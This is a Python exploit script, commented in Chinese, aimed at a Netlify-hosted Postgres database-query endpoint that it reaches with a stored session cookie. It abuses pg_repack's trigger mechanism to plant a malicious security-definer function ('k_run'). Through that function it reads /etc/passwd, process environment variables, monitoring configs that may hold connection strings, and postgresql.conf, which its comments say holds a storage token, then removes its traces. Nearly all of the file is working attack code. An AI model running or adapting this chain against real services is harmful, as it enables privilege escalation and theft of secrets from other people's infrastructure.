# -*- coding: utf-8 -*-
"""波25:文件读第二轮 —— /etc 敏感文件 + environ hex 技巧
E1 /etc/passwd
E2 /etc/environment
E3 /etc/neon_compute_collector-v18.yml(监控配置,可能带连接串)
E4 /etc/postgres_exporter.yml
E5 /proc/self/environ(hex 替换 NUL)
E6 /proc/1/cmdline(hex)
E7 postgresql.conf 完整(storage_token 全量)
E8 清理
"""
import http.client, ssl, gzip, brotli, json, sys, time, re
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, timeout=60):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_ID, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:9000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


def build_chain():
    evil = ("create or replace function public.k_evil() returns trigger language plpgsql as $q$ "
            "begin "
            "  begin execute 'drop table if exists public.k_pwned'; exception when others then null; end; "
            "  begin execute 'create table public.k_pwned as select current_user::text as u, session_user::text as su'; exception when others then null; end; "
            "  begin execute $f$create or replace function public.k_run(q text) returns setof text language plpgsql security definer as $z$ "
            "begin "
            "  begin "
            "    return query execute q; "
            "  exception when others then "
            "    execute q; "
            "    return query select 'OK'; "
            "  end; "
            "end $z$$f$; exception when others then null; end; "
            "  return new; "
            "end $q$")
    s, b, dt = tx(["drop table if exists k_src",
                   "create table k_src(id int, v text)",
                   "select 'OID='||oid||' NAME='||relname from pg_class where relname='k_src'"])
    m = re.search(r'OID=(\d+)', b)
    oid = m.group(1) if m else None
    if not oid:
        return None
    s, b, dt = tx(["create type repack.pk_%s as (id int)" % oid,
                   "create table repack.log_%s (pk repack.pk_%s, row public.k_src)" % (oid, oid)])
    s, b, dt = tx(["drop trigger if exists k_log_trg on repack.log_%s" % oid,
                   "drop trigger if exists k_src_trg on k_src",
                   evil,
                   "create trigger k_log_trg after insert on repack.log_%s for each row execute function public.k_evil()" % oid,
                   "create trigger k_src_trg after insert on k_src for each row execute function repack.repack_trigger('id')",
                   "insert into k_src values (1, 'x')"])
    return oid if s == 200 else None


def cleanup(oid):
    evil2 = ("create or replace function public.k_evil() returns trigger language plpgsql as $q$ "
             "begin "
             "  begin execute 'drop function if exists public.k_run cascade'; exception when others then null; end; "
             "  begin execute 'drop table if exists public.k_pwned'; exception when others then null; end; "
             "  return new; "
             "end $q$")
    tx(["drop trigger if exists k_src_trg on k_src",
        "drop trigger if exists k_log_trg on repack.log_%s" % oid,
        evil2,
        "create trigger k_src_trg after insert on k_src for each row execute function repack.repack_trigger('id')",
        "insert into k_src values (2, 'c')"])
    tx(["drop trigger if exists k_src_trg on k_src",
        "drop trigger if exists k_log_trg on repack.log_%s" % oid,
        "drop function if exists public.k_evil()",
        "drop table if exists repack.log_%s" % oid,
        "drop type if exists repack.pk_%s" % oid,
        "drop table if exists k_src"])


def rd(path, mode='text'):
    """k_run 读文件;mode=text 直接 pg_read_file;mode=bin 用 hex 替换 NUL"""
    if mode == 'text':
        return "select * from public.k_run('select pg_read_file(''%s'')')" % path
    return ("select * from public.k_run('select convert_from(decode(replace(encode("
            "pg_read_binary_file(''%s''),''00'',''0a''),''hex''),''LATIN1'')')" % path)


print('== 建链 ==')
oid = build_chain()
if not oid:
    sys.exit('chain fail')
print('chain ok oid=%s' % oid)

probes = [
    ('E1_passwd',      rd('/etc/passwd')),
    ('E2_environment', rd('/etc/environment')),
    ('E3_collector',   rd('/etc/neon_compute_collector-v18.yml')),
    ('E3b_sqlexp',     rd('/etc/neon_compute_sql_exporter.yml')),
    ('E4_postgresexp', rd('/etc/postgres_exporter.yml')),
    ('E5_environ',     rd('/proc/self/environ', 'bin')),
    ('E6_pid1',        rd('/proc/1/cmdline', 'bin')),
    ('E7_conf',        rd('postgresql.conf')),
]
for name, q in probes:
    s, b, dt = tx([q])
    print('%s [%d] %.1fs' % (name, s, dt))
    print('   ' + b[:5000])
    print()

print('== 清理 ==')
cleanup(oid)
print('cleaned')
